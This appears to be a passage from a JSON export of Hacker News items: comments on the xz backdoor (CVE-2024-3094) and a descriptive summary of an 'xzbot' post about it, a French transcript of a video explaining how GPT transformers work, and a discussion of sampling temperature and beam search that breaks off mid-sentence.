servers with open SSH in the wild. reply rwmj 16 hours agoparentprevIf it hadn't been discovered for another month or so, then it would have appeared in stable Fedora 40, Ubuntu 24.4 and Debian, and then it definitely would have been exploited. Another year it would have been in RHEL 10. Very luck escape. reply bclemens 7 hours agorootparentNope, it wouldn't have been in RHEL 10 or any of the rebuilds. CentOS Stream 10 already branched from Fedora / ELN. The closest it would have gotten is a Fedora ELN compose, and it's doubtful it would have remained undiscovered long enough to end up in CentOS Stream 11. reply rwmj 2 hours agorootparentWe likely would have backported the change. I'm already planning a big rebase of packages that missed the Fedora 40 / C10S branch (related to RISC-V in that case). reply 142 more comments... GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The xzbot exploration delves into detecting and exploiting the xz backdoor (CVE-2024-3094) using a honeypot, ed448 patch, backdoor format, and demonstration.",
      "It outlines running a command on a vulnerable SSH server and elucidates the process tree post-exploitation, devoid of generating log entries.",
      "The post includes references to additional resources for further understanding."
    ],
    "commentSummary": [
      "Multiple cases of backdoor exploits, social engineering attacks, and potential state-sponsored hacking in open source software projects are discussed, emphasizing the challenges of detecting and preventing these attacks.",
      "The importance of transparency, attribution, and proactive security measures is highlighted, along with the legal and ethical implications of intentionally installing backdoors in software.",
      "Discussions on the involvement of intelligence agencies, nation-states, and organized crime groups in cyber attacks, as well as the limitations of current security technologies against advanced threats, are included in the debate."
    ],
    "points": 765,
    "commentCount": 396,
    "retryCount": 0,
    "time": 1711986028
  },
  {
    "id": 39898221,
    "title": "Exploring GPT: Transformer's Text Generation Power",
    "originLink": "https://www.youtube.com/watch?v=wjZofJX0v4M",
    "originBody": "Les initiales GPT signifient Generative Pretrained Transformer (transformateur génératif préformé). Ce premier mot est donc assez simple, ce sont des bots qui génèrent de nouveaux textes. Le préfixe indique que le modèle a été soumis à un processus d'apprentissage à partir d'une quantité massive de données, et le préfixe insinue qu'il y a plus de place pour l'affiner sur des tâches spécifiques avec un entraînement supplémentaire. Mais le dernier mot, c'est la vraie pièce maîtresse. Un transformateur est un type spécifique de réseau neuronal, un modèle d'apprentissage automatique, et c'est l'invention centrale qui sous-tend l'essor actuel de l'IA. Ce que je veux faire avec cette vidéo et les chapitres suivants, c'est expliquer visuellement ce qui se passe réellement à l'intérieur d'un transformateur. Nous allons suivre les données qui y circulent et procéder étape par étape. Il existe de nombreuses sortes de modèles que tu peux construire à l'aide de transformateurs. Certains modèles prennent des données audio et produisent une transcription. Cette phrase provient d'un modèle qui va dans l'autre sens, en produisant un discours synthétique uniquement à partir d'un texte. Tous ces outils qui ont pris le monde d'assaut en 2022 comme Dolly et Midjourney qui prennent en compte une description textuelle et produisent une image sont basés sur des transformateurs. Même si je n'arrive pas à lui faire comprendre ce qu'est censée être une créature de tarte, je suis toujours époustouflée de voir que ce genre de chose est possible, même de loin. Et le transformateur original introduit en 2017 par Google a été inventé pour le cas d'utilisation spécifique de la traduction de texte d'une langue à une autre. Mais la variante sur laquelle toi et moi allons nous concentrer, et qui est le type d'outil qui sous-tend des outils comme ChatGPT, sera un modèle qui est entraîné à prendre un morceau de texte, peut-être même avec des images ou des sons qui l'accompagnent, et à produire une prédiction pour ce qui vient ensuite dans le passage. Cette prédiction prend la forme d'une distribution de probabilités sur de nombreux morceaux de texte différents qui pourraient suivre. À première vue, tu pourrais penser que prédire le mot suivant semble être un objectif très différent de celui de générer un nouveau texte. Mais une fois que tu as un modèle de prédiction comme celui-ci, une façon simple de générer un texte plus long est de lui donner un extrait initial avec lequel travailler, de lui demander de prendre un échantillon aléatoire de la distribution qu'il vient de générer, d'ajouter cet échantillon au texte, puis de relancer tout le processus pour faire une nouvelle prédiction basée sur tout le nouveau texte, y compris ce qu'il vient d'ajouter. Je ne sais pas ce qu'il en est pour toi, mais je n'ai vraiment pas l'impression que cela devrait fonctionner. Dans cette animation, par exemple, j'exécute GPT-2 sur mon ordinateur portable et je lui demande de prédire et d'échantillonner de façon répétée le prochain morceau de texte pour générer une histoire basée sur le texte de départ. L'histoire n'a pas vraiment de sens. Mais si je le remplace par des appels d'API à GPT-3, qui est le même modèle de base, juste beaucoup plus grand, soudain, presque par magie, nous obtenons une histoire sensée, qui semble même déduire qu'une créature pi vivrait dans un pays de maths et de calculs. Ce processus de prédiction et d'échantillonnage répétés est essentiellement ce qui se passe lorsque tu interagis avec ChatGPT ou tout autre grand modèle de langage et que tu les vois produire un mot à la fois. En fait, une fonction que j'apprécierais beaucoup est la possibilité de voir la distribution sous-jacente pour chaque nouveau mot qu'il choisit. Commençons par un aperçu de très haut niveau de la façon dont les données circulent dans un transformateur. Nous passerons beaucoup plus de temps à motiver, interpréter et développer les détails de chaque étape, mais dans les grandes lignes, lorsqu'un de ces chatbots génère un mot donné, voici ce qui se passe sous le capot. Tout d'abord, l'entrée est décomposée en un tas de petits morceaux. Ces morceaux sont appelés jetons, et dans le cas d'un texte, il s'agit généralement de mots ou de petits morceaux de mots ou d'autres combinaisons de caractères courantes. S'il s'agit d'images ou de sons, les jetons peuvent être de petites parties de cette image ou de petits morceaux de ce son. Chacun de ces jetons est ensuite associé à un vecteur, c'est-à-dire à une liste de nombres, qui est censé coder d'une manière ou d'une autre la signification de cette pièce. Si tu considères que ces vecteurs donnent des coordonnées dans un espace à très haute dimension, les mots ayant des significations similaires ont tendance à atterrir sur des vecteurs qui sont proches les uns des autres dans cet espace. Cette séquence de vecteurs passe ensuite par une opération connue sous le nom de bloc d'attention, ce qui permet aux vecteurs de se parler et de se transmettre des informations pour mettre à jour leurs valeurs. Par exemple, le sens du mot modèle dans l'expression un modèle d'apprentissage automatique est différent de son sens dans l'expression un modèle de mode. Le bloc d'attention est chargé de déterminer quels mots du contexte sont pertinents pour mettre à jour la signification de quels autres mots, et comment exactement ces significations doivent être mises à jour. Et encore une fois, chaque fois que j'utilise le mot sens, celui-ci est en quelque sorte entièrement codé dans les entrées de ces vecteurs. Ensuite, ces vecteurs passent par un autre type d'opération, et selon la source que tu lis, on parlera d'un perceptron multicouche ou peut-être d'une couche d'anticipation. Et ici, les vecteurs ne se parlent pas, ils subissent tous la même opération en parallèle. Et bien que ce bloc soit un peu plus difficile à interpréter, nous verrons plus loin que cette étape revient un peu à poser une longue liste de questions sur chaque vecteur, puis à les mettre à jour en fonction des réponses à ces questions. Toutes les opérations dans ces deux blocs ressemblent à une pile géante de multiplications de matrices, et notre travail principal va consister à comprendre comment lire les matrices sous-jacentes. Je passe sous silence certains détails concernant les étapes de normalisation qui se déroulent entre les deux, mais il s'agit après tout d'un aperçu de haut niveau. Après cela, le processus se répète essentiellement, tu vas et viens entre les blocs d'attention et les blocs de perceptron multicouche, jusqu'à ce qu'à la toute fin, l'espoir est que toute la signification essentielle du passage a été en quelque sorte incorporée dans le tout dernier vecteur de la séquence. Nous effectuons ensuite une certaine opération sur ce dernier vecteur qui produit une distribution de probabilité sur tous les tokens possibles, tous les petits morceaux de texte possibles qui pourraient venir ensuite. Et comme je l'ai dit, une fois que tu as un outil qui prédit ce qui vient après un extrait de texte, tu peux lui donner un peu de texte de départ et le faire jouer à plusieurs reprises à ce jeu de prédiction de ce qui vient après, d'échantillonnage de la distribution, d'ajout, et de répétition encore et encore. Certains d'entre vous se souviennent peut-être que bien avant que ChatGPT n'entre en scène, voici à quoi ressemblaient les premières démonstrations de GPT-3, qui permettaient de compléter automatiquement des histoires et des essais à partir d'un extrait initial. Pour transformer un outil comme celui-ci en chatbot, le point de départ le plus simple est d'avoir un petit bout de texte qui établit le cadre d'une interaction entre un utilisateur et un assistant IA utile, ce que tu appellerais l'invite du système, puis tu utiliserais la question ou l'invite initiale de l'utilisateur comme premier bout de dialogue, puis tu ferais en sorte qu'il commence à prédire ce qu'un assistant IA aussi utile dirait en réponse. Il y a plus à dire sur l'étape de formation nécessaire pour que cela fonctionne bien, mais à un niveau élevé, c'est l'idée. Dans ce chapitre, toi et moi allons nous étendre sur les détails de ce qui se passe au tout début du réseau, à la toute fin du réseau, et je veux aussi passer beaucoup de temps à revoir certains éléments importants de connaissances de base, des choses qui auraient été une seconde nature pour n'importe quel ingénieur en apprentissage automatique au moment où les transformateurs sont apparus. Si tu te sens à l'aise avec ces connaissances de base et que tu es un peu impatient, tu peux te sentir libre de passer au chapitre suivant, qui va se concentrer sur les blocs d'attention, généralement considérés comme le cœur du transformateur. Après cela, je veux parler davantage de ces blocs de perceptron multicouche, du fonctionnement de l'entraînement et d'un certain nombre d'autres détails qui auront été sautés jusqu'à ce point. Pour un contexte plus large, ces vidéos sont des ajouts à une mini-série sur l'apprentissage profond, et ce n'est pas grave si tu n'as pas regardé les précédentes, je pense que tu peux le faire dans le désordre, mais avant de plonger dans les transformateurs en particulier, je pense qu'il vaut la peine de s'assurer que nous sommes sur la même longueur d'onde en ce qui concerne le principe de base et la structure de l'apprentissage profond. Au risque d'énoncer l'évidence, il s'agit d'une approche de l'apprentissage automatique, qui décrit tout modèle dans lequel tu utilises des données pour déterminer d'une manière ou d'une autre le comportement d'un modèle. Ce que je veux dire par là, c'est que tu veux une fonction qui prend une image et qui produit une étiquette la décrivant, ou notre exemple de prédiction du mot suivant dans un passage de texte, ou toute autre tâche qui semble nécessiter un certain élément d'intuition et de reconnaissance des formes. Nous considérons presque cela comme acquis de nos jours, mais l'idée de l'apprentissage automatique est qu'au lieu d'essayer de définir explicitement une procédure pour effectuer cette tâche dans le code, ce que les gens auraient fait dans les premiers jours de l'IA, tu mets en place une structure très flexible avec des paramètres réglables, comme un tas de boutons et de cadrans, et ensuite, d'une manière ou d'une autre, tu utilises de nombreux exemples de ce à quoi la sortie devrait ressembler pour une entrée donnée, pour ajuster et régler les valeurs de ces paramètres afin d'imiter ce comportement. Par exemple, la forme la plus simple d'apprentissage automatique est peut-être la régression linéaire, où tes entrées et tes sorties sont chacune des nombres uniques, quelque chose comme la superficie d'une maison et son prix, et ce que tu veux, c'est trouver une ligne de meilleur ajustement à travers ces données, tu sais, pour prédire les prix futurs des maisons. Cette ligne est décrite par deux paramètres continus, à savoir la pente et l'ordonnée à l'origine, et l'objectif de la régression linéaire est de déterminer ces paramètres pour qu'ils correspondent étroitement aux données. Inutile de dire que les modèles d'apprentissage profond deviennent beaucoup plus compliqués. Le GPT-3, par exemple, n'a pas deux, mais 175 milliards de paramètres. Mais voilà, il n'est pas évident que tu puisses créer un modèle géant avec un grand nombre de paramètres sans qu'il ne surajoute grossièrement les données d'apprentissage ou qu'il ne soit complètement impossible à former. L'apprentissage profond décrit une classe de modèles qui, au cours des deux dernières décennies, se sont révélés remarquablement évolutifs. Ce qui les unit, c'est le même algorithme d'apprentissage, appelé rétropropagation, et le contexte que je veux que tu aies au fur et à mesure que nous avançons, c'est que pour que cet algorithme d'apprentissage fonctionne bien à l'échelle, ces modèles doivent suivre un certain format spécifique. Si tu connais ce format au départ, cela permet d'expliquer un grand nombre des choix de traitement de la langue par un transformateur, qui risquent sinon de sembler arbitraires. Tout d'abord, quel que soit le modèle que tu fais, l'entrée doit être formatée comme un tableau de nombres réels. Il peut s'agir d'une liste de nombres, d'un tableau à deux dimensions ou, très souvent, de tableaux à plus haute dimension, pour lesquels le terme général utilisé est tenseur. Tu considères souvent que ces données d'entrée sont progressivement transformées en plusieurs couches distinctes, où chaque couche est toujours structurée comme une sorte de tableau de nombres réels, jusqu'à ce que tu arrives à une couche finale que tu considères comme la sortie. Par exemple, la dernière couche de notre modèle de traitement de texte est une liste de nombres représentant la distribution de probabilité pour tous les prochains tokens possibles. Dans l'apprentissage profond, ces paramètres de modèle sont presque toujours appelés poids, et ce parce qu'une caractéristique clé de ces modèles est que la seule façon dont ces paramètres interagissent avec les données traitées est par le biais de sommes pondérées. Tu saupoudres également quelques fonctions non linéaires, mais elles ne dépendent pas de paramètres. Généralement, au lieu de voir les sommes pondérées toutes nues et écrites explicitement comme ceci, tu les trouveras plutôt regroupées sous forme de divers composants dans un produit vectoriel matriciel. Cela revient à dire la même chose, si tu repenses à la façon dont fonctionne la multiplication vectorielle matricielle, chaque composant de la sortie ressemble à une somme pondérée. Pour toi et moi, il est souvent plus simple, d'un point de vue conceptuel, de penser à des matrices remplies de paramètres réglables qui transforment les vecteurs tirés des données en cours de traitement. Par exemple, les 175 milliards de poids du GPT-3 sont organisés en un peu moins de 28 000 matrices distinctes. Ces matrices se répartissent à leur tour en huit catégories différentes, et ce que nous allons faire, toi et moi, c'est passer en revue chacune de ces catégories pour comprendre ce que fait ce type de matrice. Au fur et à mesure que nous avançons, je pense qu'il est amusant de se référer aux chiffres spécifiques de GPT-3 pour compter exactement d'où viennent ces 175 milliards. Même s'il existe aujourd'hui des modèles plus grands et meilleurs, celui-ci a un certain charme en tant que modèle de grande langue pour vraiment capter l'attention du monde en dehors des communautés ML. De plus, d'un point de vue pratique, les entreprises ont tendance à garder les lèvres beaucoup plus serrées sur les chiffres spécifiques des réseaux plus modernes. Je veux juste te montrer que lorsque tu regardes sous le capot pour voir ce qui se passe à l'intérieur d'un outil comme ChatGPT, presque tous les calculs ressemblent à des multiplications de matrices et de vecteurs. Il y a un petit risque de se perdre dans la mer de milliards de chiffres, mais tu dois faire une distinction très nette dans ton esprit entre les poids du modèle, que je colorerai toujours en bleu ou en rouge, et les données traitées, que je colorerai toujours en gris. Les poids sont les cerveaux réels, ce sont les choses apprises pendant l'entraînement, et ils déterminent son comportement. Les données traitées codent simplement l'entrée spécifique introduite dans le modèle pour une exécution donnée, comme un exemple de bout de texte. Avec tout cela comme base, entrons dans la première étape de cet exemple de traitement de texte, qui consiste à diviser l'entrée en petits morceaux et à transformer ces morceaux en vecteurs. J'ai mentionné que ces morceaux sont appelés des jetons, qui peuvent être des morceaux de mots ou de ponctuation, mais de temps en temps, dans ce chapitre et surtout dans le prochain, j'aimerais faire semblant que c'est divisé plus proprement en mots. Comme nous, les humains, pensons avec des mots, cela facilitera grandement la référence à de petits exemples et la clarification de chaque étape. Le modèle possède un vocabulaire prédéfini, une liste de tous les mots possibles, disons 50 000 d'entre eux, et la première matrice que nous rencontrerons, appelée matrice d'intégration, comporte une seule colonne pour chacun de ces mots. Ce sont ces colonnes qui déterminent le vecteur en lequel chaque mot se transforme dans cette première étape. Nous l'appelons We, et comme toutes les matrices que nous voyons, ses valeurs commencent au hasard, mais elles vont être apprises en fonction des données. Transformer des mots en vecteurs était une pratique courante en apprentissage automatique bien avant les transformateurs, mais c'est un peu bizarre si tu ne l'as jamais vu auparavant, et cela pose les bases de tout ce qui suit, alors prenons un moment pour nous familiariser avec. Nous appelons souvent cet encastrement un mot, ce qui t'invite à considérer ces vecteurs de façon très géométrique comme des points dans un espace à haute dimension. Visualiser une liste de trois nombres comme des coordonnées de points dans l'espace 3D ne poserait aucun problème, mais les enchâssements de mots ont tendance à être beaucoup plus dimensionnels. Dans GPT-3, il y a 12 288 dimensions, et comme tu le verras, il est important de travailler dans un espace qui a beaucoup de directions distinctes. De la même façon que tu peux prendre une tranche bidimensionnelle dans un espace 3D et projeter tous les points sur cette tranche, pour animer les enchâssements de mots qu'un modèle simple me donne, je vais faire une chose analogue en choisissant une tranche tridimensionnelle dans cet espace à très haute dimension, et en projetant les vecteurs de mots vers le bas sur cette tranche et en affichant les résultats. L'idée principale ici est qu'au fur et à mesure qu'un modèle ajuste et règle ses poids pour déterminer comment les mots sont intégrés sous forme de vecteurs au cours de la formation, il tend à se fixer sur un ensemble d'intégrations où les directions dans l'espace ont une sorte de signification sémantique. Pour le modèle simple mot-vecteur que j'utilise ici, si je lance une recherche pour tous les mots dont l'intégration est la plus proche de celle de tour, tu remarqueras qu'ils semblent tous donner une impression de tour très similaire. Et si tu veux utiliser Python et t'amuser à la maison, voici le modèle spécifique que j'utilise pour faire les animations. Ce n'est pas un transformateur, mais c'est suffisant pour illustrer l'idée que les directions dans l'espace peuvent être porteuses de sens sémantique. Un exemple très classique de ceci est la différence entre les vecteurs de la femme et de l'homme, quelque chose que tu visualiserais comme un petit vecteur reliant la pointe de l'un à la pointe de l'autre, c'est très similaire à la différence entre le roi et la reine. Supposons donc que tu ne connaisses pas le mot désignant une femme monarque, tu pourrais le trouver en prenant roi, en ajoutant cette direction femme-homme et en recherchant les encastrements les plus proches de ce point. Du moins, en quelque sorte. Bien qu'il s'agisse d'un exemple classique pour le modèle avec lequel je joue, l'intégration réelle de la reine est en fait un peu plus éloignée que ce qui est suggéré, probablement parce que la façon dont la reine est utilisée dans les données de formation n'est pas simplement une version féminine du roi. Lorsque je me suis amusé, les relations familiales semblaient illustrer beaucoup mieux l'idée. Le fait est qu'il semble que pendant la formation, le modèle a trouvé avantageux de choisir des encastrements tels qu'une direction dans cet espace encode des informations sur le sexe. Un autre exemple est que si tu prends l'encastrement de l'Italie, que tu soustrais l'encastrement de l'Allemagne, et que tu ajoutes cela à l'encastrement d'Hitler, tu obtiens quelque chose de très proche de l'encastrement de Mussolini. C'est comme si le modèle avait appris à associer certaines directions à l'italianité, et d'autres aux dirigeants de l'axe de la Seconde Guerre mondiale. Mon exemple préféré dans cette veine est peut-être la façon dont, dans certains modèles, si tu prends la différence entre l'Allemagne et le Japon, et que tu l'ajoutes aux sushis, tu te retrouves très proche de la saucisse bratwurst. En jouant à ce jeu de recherche des voisins les plus proches, j'ai également été heureuse de voir à quel point Kat était proche à la fois de la bête et du monstre. Une intuition mathématique qu'il est utile d'avoir à l'esprit, en particulier pour le chapitre suivant, est que le produit en points de deux vecteurs peut être considéré comme un moyen de mesurer leur degré d'alignement. D'un point de vue informatique, les produits points impliquent la multiplication de tous les composants correspondants et l'addition des résultats, ce qui est une bonne chose, puisqu'une grande partie de nos calculs doit ressembler à des sommes pondérées. Géométriquement, le produit du point est positif lorsque les vecteurs pointent dans des directions similaires, il est nul s'ils sont perpendiculaires et il est négatif lorsqu'ils pointent dans des directions opposées. Par exemple, disons que tu joues avec ce modèle, et que tu émets l'hypothèse que l'intégration de chats moins chat pourrait représenter une sorte de direction de la pluralité dans cet espace. Pour tester cela, je vais prendre ce vecteur et calculer son produit point par rapport aux embeddings de certains noms singuliers, et le comparer aux produits points avec les noms pluriels correspondants. Si tu t'amuses avec ça, tu remarqueras que les pluriels semblent en effet donner systématiquement des valeurs plus élevées que les singuliers, ce qui indique qu'ils s'alignent davantage sur cette direction. C'est aussi amusant de voir que si tu fais le produit de ce point avec l'intégration des mots 1, 2, 3, et ainsi de suite, ils donnent des valeurs croissantes, c'est comme si nous pouvions mesurer quantitativement à quel point le modèle trouve un mot donné pluriel. Encore une fois, les spécificités de la façon dont les mots sont intégrés sont apprises à l'aide de données. Cette matrice d'intégration, dont les colonnes nous indiquent ce qu'il advient de chaque mot, constitue la première pile de poids de notre modèle. En utilisant les chiffres du GPT-3, la taille du vocabulaire est spécifiquement de 50 257, et encore une fois, techniquement, il ne s'agit pas de mots en tant que tels, mais de jetons. La dimension d'intégration est de 12 288, et la multiplication de ces dimensions nous indique qu'il s'agit d'environ 617 millions de poids. Allons-y et ajoutons ceci à un décompte en cours, en nous rappelant qu'à la fin, nous devrions compter jusqu'à 175 milliards. Dans le cas des transformateurs, tu dois vraiment penser que les vecteurs de cet espace d'intégration ne représentent pas simplement des mots individuels. D'une part, ils encodent également des informations sur la position de ce mot, ce dont nous parlerons plus tard, mais surtout, tu dois considérer qu'ils ont la capacité de s'imprégner du contexte. Un vecteur qui a commencé sa vie comme l'intégration du mot roi, par exemple, pourrait progressivement être tiré par divers blocs de ce réseau, de sorte qu'à la fin, il pointe dans une direction beaucoup plus spécifique et nuancée qui code en quelque sorte qu'il s'agissait d'un roi qui vivait en Écosse, qui avait obtenu son poste après avoir assassiné le roi précédent, et qui est décrit dans la langue de Shakespeare. Réfléchis à ta propre compréhension d'un mot donné. La signification de ce mot est clairement influencée par l'environnement, et parfois cela inclut un contexte très éloigné, donc en mettant en place un modèle qui a la capacité de prédire le mot suivant, l'objectif est de le rendre capable d'incorporer le contexte de manière efficace. Pour être clair, dans cette toute première étape, lorsque tu crées le tableau de vecteurs basé sur le texte d'entrée, chacun d'entre eux est simplement extrait de la matrice d'intégration, de sorte qu'au départ, chacun d'entre eux ne peut encoder que la signification d'un seul mot sans aucune contribution de son environnement. Mais tu dois considérer que l'objectif premier de ce réseau par lequel il passe est de permettre à chacun de ces vecteurs de s'imprégner d'un sens beaucoup plus riche et spécifique que ce que de simples mots individuels pourraient représenter. Le réseau ne peut traiter qu'un nombre fixe de vecteurs à la fois, appelé taille du contexte. Pour GPT-3, il a été formé avec une taille de contexte de 2048, de sorte que les données qui circulent dans le réseau ressemblent toujours à ce tableau de 2048 colonnes, chacune d'entre elles ayant 12 000 dimensions. Cette taille de contexte limite la quantité de texte que le transformateur peut incorporer lorsqu'il prédit le mot suivant. C'est pourquoi les longues conversations avec certains chatbots, comme les premières versions de ChatGPT, donnaient souvent l'impression que le bot perdait en quelque sorte le fil de la conversation lorsque tu continuais trop longtemps. Nous entrerons dans les détails de l'attention en temps voulu, mais en passant, je veux parler un instant de ce qui se passe à la toute fin. Rappelle-toi que le résultat souhaité est une distribution de probabilités sur tous les jetons qui pourraient venir ensuite. Par exemple, si le tout dernier mot est Professeur, et que le contexte inclut des mots comme Harry Potter, et qu'immédiatement avant nous voyons le professeur le moins aimé, et aussi si tu me laisses une certaine marge de manœuvre en me permettant de prétendre que les jetons ressemblent simplement à des mots complets, alors un réseau bien entraîné qui a accumulé des connaissances sur Harry Potter attribuerait vraisemblablement un nombre élevé au mot Rogue. Cela implique deux étapes différentes. La première consiste à utiliser une autre matrice qui fait correspondre le tout dernier vecteur de ce contexte à une liste de 50 000 valeurs, une pour chaque token du vocabulaire. Il y a ensuite une fonction qui normalise tout cela en une distribution de probabilité, elle s'appelle Softmax et nous en parlerons plus en détail dans une seconde, mais avant cela, il peut sembler un peu bizarre de n'utiliser que cette dernière intégration pour faire une prédiction, alors qu'après tout, dans cette dernière étape, il y a des milliers d'autres vecteurs dans la couche qui sont juste là avec leurs propres significations riches en contexte. Cela s'explique par le fait qu'au cours du processus de formation, il s'avère beaucoup plus efficace d'utiliser chacun de ces vecteurs dans la couche finale pour faire simultanément une prédiction pour ce qui vient immédiatement après. Il y aura beaucoup plus à dire sur la formation plus tard, mais je veux juste le rappeler tout de suite. Cette matrice est appelée matrice de désencastrement et nous lui donnons l'étiquette WU. Encore une fois, comme toutes les matrices de poids que nous voyons, ses entrées commencent au hasard, mais elles sont apprises au cours du processus de formation. Pour garder le cap sur le nombre total de paramètres, cette matrice de désencastrement comporte une ligne pour chaque mot du vocabulaire, et chaque ligne a le même nombre d'éléments que la dimension d'encastrement. Elle ajoute donc 617 millions de paramètres supplémentaires au réseau, ce qui signifie que nous en avons compté un peu plus d'un milliard jusqu'à présent, une petite fraction, mais pas totalement insignifiante, des 175 milliards que nous finirons par avoir au total. En tant que dernière mini-leçon de ce chapitre, je veux parler plus en détail de cette fonction softmax, puisqu'elle fait une autre apparition pour nous une fois que nous nous plongeons dans les blocs d'attention. L'idée est que si tu veux qu'une séquence de nombres agisse comme une distribution de probabilités, par exemple une distribution sur tous les mots suivants possibles, alors chaque valeur doit être comprise entre 0 et 1, et il faut aussi que leur somme soit égale à 1. Cependant, si tu joues le jeu de l'apprentissage où tout ce que tu fais ressemble à une multiplication matrice-vecteur, les résultats que tu obtiens par défaut ne respectent pas du tout cette règle. Les valeurs sont souvent négatives, ou beaucoup plus grandes que 1, et il est presque certain que leur somme n'est pas égale à 1. Softmax est le moyen standard de transformer une liste arbitraire de nombres en une distribution valide de telle sorte que les plus grandes valeurs se rapprochent le plus de 1, et que les plus petites valeurs se rapprochent le plus de 0. C'est tout ce que tu as besoin de savoir. Mais si tu es curieux, la méthode consiste d'abord à élever e à la puissance de chacun des nombres, ce qui signifie que tu as maintenant une liste de valeurs positives, puis tu peux prendre la somme de toutes ces valeurs positives et diviser chaque terme par cette somme, ce qui normalise le tout en une liste dont la somme est égale à 1. Tu remarqueras que si l'un des nombres de l'entrée est significativement plus grand que le reste, alors dans la sortie, le terme correspondant domine la distribution, de sorte que si tu l'échantillonnais, tu choisirais presque certainement l'entrée qui maximise la distribution. Mais c'est plus doux que de simplement choisir le maximum dans le sens où lorsque d'autres valeurs sont aussi importantes, elles ont également un poids significatif dans la distribution, et tout change continuellement lorsque tu fais varier continuellement les entrées. Dans certaines situations, comme lorsque ChatGPT utilise cette distribution pour créer un mot suivant, il est possible de s'amuser un peu plus en ajoutant un peu de piment à cette fonction, avec une constante t jetée dans le dénominateur de ces exposants. Nous l'appelons la température, car elle ressemble vaguement au rôle de la température dans certaines équations thermodynamiques, et l'effet est que lorsque t est plus grand, tu donnes plus de poids aux valeurs inférieures, ce qui signifie que la distribution est un peu plus uniforme, et si t est plus petit, alors les valeurs les plus grandes domineront plus agressivement, où à l'extrême, en mettant t égal à zéro signifie que tout le poids va à la valeur maximale. Par exemple, je demanderai à GPT-3 de générer une histoire avec le texte de départ, il était une fois A, mais j'utiliserai des températures différentes dans chaque cas. La température zéro signifie qu'elle va toujours avec le mot le plus prévisible, et ce que tu obtiens finit par être un dérivé banal de Boucle d'or. Une température plus élevée lui donne une chance de choisir des mots moins probables, mais cela comporte un risque. Dans ce cas, l'histoire commence de façon plus originale, à propos d'un jeune artiste web de Corée du Sud, mais elle dégénère rapidement en non-sens. Techniquement parlant, l'API ne te permet pas de choisir une température supérieure à 2. Il n'y a aucune raison mathématique à cela, c'est juste une contrainte arbitraire imposée pour éviter que leur outil ne soit vu comme générant des choses trop insensées. Si tu es curieux, cette animation fonctionne en fait de la façon suivante : je prends les 20 prochains jetons les plus probables générés par GPT-3, ce qui semble être le maximum qu'ils me donnent, puis je modifie les probabilités en fonction d'un exposant de 1,5. Autre élément de jargon, de la même façon que tu pourrais appeler les composantes de la sortie de cette fonction des probabilités, les gens appellent souvent les entrées des logits, ou certains disent des logits, d'autres des logits, je vais dire des logits. Ainsi, par exemple, lorsque tu introduis un texte, que tous ces enchâssements de mots circulent dans le réseau et que tu fais cette multiplication finale avec la matrice de désencastrement, les spécialistes de l'apprentissage automatique se réfèrent aux composants de cette sortie brute, non normalisée, comme étant les logits pour la prédiction du mot suivant. L'objectif de ce chapitre était en grande partie de jeter les bases de la compréhension du mécanisme de l'attention, style Karate Kid cire sur cire. Tu vois, si tu as une forte intuition pour l'intégration de mots, pour la méthode softmax, pour la façon dont les produits de points mesurent la similarité, et aussi le principe sous-jacent selon lequel la plupart des calculs doivent ressembler à une multiplication de matrice avec des matrices pleines de paramètres réglables, alors la compréhension du mécanisme de l'attention, cette pièce maîtresse de tout le boom moderne de l'IA, devrait être relativement aisée. Pour cela, viens me rejoindre dans le prochain chapitre. À l'heure où je publie ces lignes, une ébauche de ce prochain chapitre est disponible pour examen par les sympathisants de Patreon. Une version finale devrait être publiée d'ici une semaine ou deux, cela dépend généralement de ce que je vais changer en fonction de cette révision. En attendant, si tu veux te plonger dans l'attention, et si tu veux aider un peu la chaîne, elle est là à attendre.",
    "commentLink": "https://news.ycombinator.com/item?id=39898221",
    "commentBody": "But what is a GPT? Visual intro to Transformers [video] (youtube.com)387 points by huhhuh 14 hours agohidepastfavorite46 comments user_7832 12 hours agoI've just started this video, but already have a question if anyone's familiar with GPT workings - I thought that these models chose the next word based on what's most likely. But if they choose based on \"one of the likely\" words, could (in general) that not lead to a situation where the list of predictions for the next word are much less likely? Running possibilities of \"two words together\", then, would be more beneficial if computationally possible (and so on for 3, 4 and n words). Does this exist? (I realize that choosing the most likely word wouldn't necessarily solve the issue, but choosing the most likely phrase possibly might.) Edit, post seeing the video and comments: it's beam search, along with temperature to control these things. reply authorfly 2 hours agoparentIn practice, beam search doesn't seem to work well for generative models. Temperature and top_k (two very similar parameters) were both introduced to account for the fact that human text is unpredictable stochastically for each sentence someone might say as such - as shown in this 2021 similar graph/reproduction of an older graph from the 2018/2019 HF documentation: https://lilianweng.github.io/posts/2021-01-02-controllable-t... It could be that beam search with much longer length does turn out to be better or some merging of the techniques works well, but I don't think so. The query-key-value part of transformers is focused on a single total in many ways - in relation to the overall context. The architecture is not meant for longer forms as such - there is no default \"two token\" system. And with 50k-100k tokens in most GPT models, you would be looking at 50k*50k = A great deal more parameters and then issues with sparsity of data. Just everything about GPT models (e.g. learned positional encodings/embeddings depending on the model iteration) is so focused on bringing the richness of a single token or single token index that the architecture is not designed for beam search like this one could say. Without considering the training complications. reply doctoboggan 12 hours agoparentprevThe temperature setting is used to select how rare of a next token is possible. If set to 0 the. The top of the likely list is chosen, if set greater than 0 then some lower probability tokens may be chosen. reply DrawTR 10 hours agorootparentCan this be potentially dangerous -- e.g. if a user types \"The answer to the expression 2 + 2 is\", isn't there a chance it chooses an output beyond the most likely one? reply Habgdnv 10 hours agorootparentUnless you screw something, a different next token does not mean wrong answer. Examples: (80% of the time) The answer to the expression 2 + 2 is 4 (15% of the time) The answer to the expression 2 + 2 is Four (5% of the time) The answer to the expression 2 + 2 is certainly (95% of the time) The answer to the expression 2 + 2 is certainly Four This is how you can asp ChatGPT the same question few times and it can give you different words each time, and still be correct. reply weitendorf 9 hours agorootparentThat assumes that the model is assigning vanishingly small weights to truly incorrect answers, which doesn't necessarily hold up in practice. So I think \"Unless you screw something\" is doing a lot of work there I think a more correct explanation would be that increasing temperature doesn't necessarily increase the probability of a truly incorrect answer proportionately to the temperature increase (because the same correct answer could be represented by many different sequences of tokens), but if the model assigns a non-zero value to any incorrect output after applying softmax (which it most likely does), increasing the temperature does increase the probability of that incorrect output being returned. reply weitendorf 9 hours agorootparentprevYes, although it's also possible that the most likely token is incorrect and perhaps the next 4 most likely tokens would lead to a correct answer. For example if you ask a model what is 0^0, the highest probability output may be \"1\", which is incorrect. The next most probable outputs may be words like \"although\", \"because\", \"Due to\", \"unfortunately\", etc. as the model prepares to explain to the user that the value of the expression is undefined; because there are many more ways to express and explain the 